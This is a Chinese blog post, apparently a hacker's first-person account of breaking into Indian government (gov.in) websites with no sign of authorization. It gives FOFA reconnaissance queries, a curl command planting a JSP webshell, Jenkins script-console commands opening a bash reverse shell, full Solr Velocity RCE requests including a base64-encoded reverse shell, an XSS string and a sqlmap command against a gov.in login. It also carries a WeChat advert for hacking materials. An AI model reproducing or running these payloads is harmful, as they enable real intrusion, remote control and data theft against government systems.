# 0x01、信息收集阶段

==注：本次信息收集过程主要使用FOFA网络探测平台 <https://fofa.info/===>

一开始进行收集的时候，有点迷，直接进行了大面积的"gov.in"域名收集

    
    
    host="gov.in" && country="IN"

![image-20230711021949594](https://image.3001.net/images/20230810/1691629864_64d43928beed48179af6c.png!small)

哈哈68465条数据，想想就起飞，但是有个问题来了，怎么下载到本地，高级用户的API也只能调用下载1w条数据，左思右想。

试着写了个脚本看看：

    
    
    import pythonfofa  
    import csv  
    ​  
    filename = "IN_domain.csv"  
    ​  
    email = 'u_mail'  
    key = 'u_API_KEY'  
    search = pythonfofa.Client(email, key)  
    get_data = search.search('host="gov.in" && country="IN"', size=70000)  
    # print(get_data)  
    ​  
    requests = [result[1] for result in get_data['results']]  
    print(requests)  
    # 打开CSV文件并设置写入模式  
    with open(filename, "w", newline="") as file:  
    writer = csv.writer(file)  
    ​  
    # 遍历请求列表  
    for request in requests:  
    # 在控制台打印域名  
    print(request)  
    ​  
    # 检测域名是否包含"http://"  
    if not request.startswith("http://") and not request.startswith("https://"):  
    # 如果不包含，则在域名前添加"http://"  
    request = "http://" + request  
    ​  
    # 在域名后添加斜杠"/"  
    request += "/"  
    ​  
    # 将请求和值"1"作为一行写入CSV文件  
    writer.writerow([request, 1])

是的，肯定不能跑，下断点，调试看看

![image-20230711024218564](https://image.3001.net/images/20230810/1691629865_64d43929c235b2f2f1aa7.png!small)

很好确实是不能直接干7w条，换个收集思路，收集主流框架进行相应的漏扫

主流框架的相关漏洞的FOFA规则语句：

 **Fastjson**

    
    
    app="Fastjson" && host="in" && country="IN" && status_code="200" && (port="80" || port="443")

 **Struts2**

    
    
    app="Struts" && host="in" && country="IN" && status_code="200" && (port="80" || port="443")

 **Log4j2**

    
    
    (app="Log4j2" && host="in" && country="IN" && status_code="200" && (port="80" || port="443"))

其他的也都大同小异，照葫芦画瓢就行。

![image-20230711025300355](https://image.3001.net/images/20230810/1691629866_64d4392a89122864fd168.png!small)

目标站点收集差不多了，就是漏洞探测阶段了。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 0x02、漏洞探测及利用

### Struts2：

直接掏出大范围漏扫AWVS就行批量漏洞探测：

![image-20230711025640689](https://image.3001.net/images/20230810/1691629867_64d4392b53d029c80d267.png!small)

第一天数据就直接起飞，因为本次目标是==getshell==直接忽略中低危漏洞告警，查看高危漏洞：

![image-20230711025838442](https://image.3001.net/images/20230810/1691629868_64d4392c792596747676a.png!small)

很好一堆==Struts2==漏洞，直接上工具：

![image-20230711030506931](https://image.3001.net/images/20230810/1691629869_64d4392d563df204c1217.png!small)

得到一个RCE（远程命令执行漏洞），远程写入==shell==，先利用工具生成一个==Antsword(蚁剑)jsp格式的shell==

![image-20230711030808818](https://image.3001.net/images/20230810/1691629870_64d4392e3c35d64e60d21.png!small)

将shell放到一个公网服务器上，接着执行命令查看web路径：`/var/tomcat9/pmrportal/ROOT/`

![image-20230711031350331](https://image.3001.net/images/20230810/1691629871_64d4392f06c5f111d97bf.png!small)

直接执行

    
    
    curl -o /var/tomcat9/pmrportal/ROOT/shell.jsp http://u_ip/antsword.jsp

然后webshell工具Antsword连接即可：

![image-20230711031634840](https://image.3001.net/images/20230810/1691629871_64d4392fc8116ebf022f7.png!small)

爆出的该S2-045的漏洞的还有几个，getshell方式同上，不进行细述了 **__** **__** **__** **__** **__**
**_** 。

### Weblogic：

![image-20230711025901659](https://image.3001.net/images/20230810/1691629872_64d43930d37493bc86c49.png!small)

很好用的awvs，直接上工具注入内存马：

![image-20230713175036472](https://image.3001.net/images/20230810/1691629873_64d43931cc8a6cf5e6d2a.png!small)

冰蝎连接webshell：

![image-20230713175143564](https://image.3001.net/images/20230810/1691629874_64d43932a6c6bcbddef3b.png!small)

同类型的漏洞还有几个，getshell的方式都一致，不一一概述了》》

（PS：这个时候已经有些疲软了，没有去手测upload的点）

### Jenkins：

中途其他框架没有收获的时候，就去浏览知识的海洋了，看到一个存在大量未授权+RCE的框架漏洞（ **Jenkins** ），二话不说，直接上FOFA：

    
    
    (app="JENKINS" && title=="Dashboard [Jenkins]" && country="IN" && status_code="200") && (port="80" || port="443")

![image-20230713220128955](https://image.3001.net/images/20230810/1691629875_64d4393384b36db2a81c4.png!small)

一看86条资产，有戏，数量不多，直接手测：

![image-20230713180849084](https://image.3001.net/images/20230810/1691629876_64d43934e256f0e01a1ec.png!small)

存在未授权，访问manager --> script页面，进行命令执行测试：

    
    
    println "ls -al".execute().text

![image-20230713181156856](https://image.3001.net/images/20230810/1691629878_64d439364a962415fa1f1.png!small)

存在命令执行，尝试反弹shell：

    
    
    println "bash -i >& /dev/tcp/ip/port 0<&1".execute().text

接收shell的服务器开启端口监听：

![image-20230713181947756](https://image.3001.net/images/20230810/1691629879_64d439377ff86c395eea0.png!small)

执行命令

![image-20230713181823099](https://image.3001.net/images/20230810/1691629880_64d43938969f2ece8f529.png!small)

发现没有shell反弹过来，猜测不能在web端执行反弹shell，于是将反弹shell的命令写入.sh文件中，然后执行，进行反弹shell操作：

在sh文件中写入如下内容：

    
    
    bash -i >& /dev/tcp/ip/port 0<&1

保存在开放的web端口，在jenkins服务中执行如下curl命令远程下载sh文件：

    
    
    println "curl - o /tmp/jenkins.sh http://u_ip:port/jenkins.sh".execute().text

![image-20230713182926953](https://image.3001.net/images/20230810/1691629881_64d439397d26588b514fa.png!small)

查看.sh文件是否获取成功：

    
    
    println "ls -al /tmp".execute().text

![image-20230713183110423](https://image.3001.net/images/20230810/1691629882_64d4393a61de70a1f2363.png!small)

获取.sh文件成功，执行文件，反弹shell：

开启监听：

![image-20230713183406307](https://image.3001.net/images/20230810/1691629883_64d4393b44c131a557b8e.png!small)

执行命令，启动.sh文件：

    
    
    println "bash /tmp/jenkins.sh".execute().text

![image-20230713183606528](https://image.3001.net/images/20230810/1691629884_64d4393c3ed37eabd0d63.png!small)

![image-20230713183513017](https://image.3001.net/images/20230810/1691629885_64d4393d75b143226e427.png!small)

成功监听到谈过来的shell，又拿下一台！其他的没有存在未授权，便没有尝试。

### Apache-Solr

闲着没事，打开文库看了几篇RCE复现，心血来潮，打开FOFA：

    
    
    country="IN" && app="Apache-Solr" && status_code="200" && (port="443" || port="80")

![image-20230719101927146](https://image.3001.net/images/20230810/1691629886_64d4393ea9a4e887204f8.png!small)

数据不大，接着手测，拿到三个未授权(不需要登陆)：

==授权==：

![image-20230719102234003](https://image.3001.net/images/20230810/1691629887_64d4393f8ce304cabffa8.png!small)

==未授权==：

![image-20230719102331665](https://image.3001.net/images/20230810/1691629888_64d4394088d1cbcca3f02.png!small)

拿到未授权之后，进行CVE探测：

访问`/solr/admin/cores/`，获取`name => music`

![image-20230719102848788](https://image.3001.net/images/20230810/1691629889_64d43941afd6973c82dc4.png!small)

接着拼接路径`/solr/music/config/`查看用户配置信息：

![image-20230719103210432](https://image.3001.net/images/20230810/1691629890_64d43942bd871fd5b8443.png!small)

都为`true`，可直接利用公网披露的payload进行RCE，

    
    
    GET /solr/music/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%22whoami%22))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1  
    Host: ip  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    DNT: 1  
    Connection: close  
    Upgrade-Insecure-Requests: 1

![image-20230719115129111](https://image.3001.net/images/20230810/1691629891_64d43943c2195c763e305.png!small)

测试是否出网：

修改执行命令为

    
    
    curl%20xtolsc.dnslog.cn

![image-20230719115425835](https://image.3001.net/images/20230810/1691629892_64d43944d1b880edd8fcd.png!small)

可出网，直接反弹shell：

    
    
    GET /solr/music/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2xxxxxx8xMDEuNDMuMTM5LjI0My81MDAwIDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end  HTTP/1.1  
    Host: ip  
    accept: */*  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close

VPS开启端口监听：`nc -lvvnp 5000`

![image-20230719115817964](https://image.3001.net/images/20230810/1691629893_64d43945e649ba3923e41.png!small)

接听到弹过来的shell了，好，又拿下一台，root权限。

### 其他漏洞发现

#### 反射型XSS

具体测试过程均无任何难度，无须bypass黑名单之类的，测试语句

    
    
    <script>alert(1)</script>

![image-20230726182631855](https://image.3001.net/images/20230810/1691629895_64d439477705db8ed3224.png!small)

#### SQL注入

这类没有具体测试，发现注入点之后直接上SQLmap开扫：

    
    
    sqlmap https://******.gov.in/****/Validate.jsp --data "email=a@a.com&password=123456" --random-agent -t 10 -p password --proxy=http://127.0.0.1:7890 --dbms=mysql

![image-20230726183935140](https://image.3001.net/images/20230810/1691629896_64d439486ceece210d541.png!small)

诸如其他的漏洞也有发现，但不是本次渗透的重点，便没重点去深入。

## 渗透总结

本次测试周期长，测试目标暴露点多，非常有趣的一次渗透实战，后期有其他事儿，就没法全身心投入，蛮可惜的。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

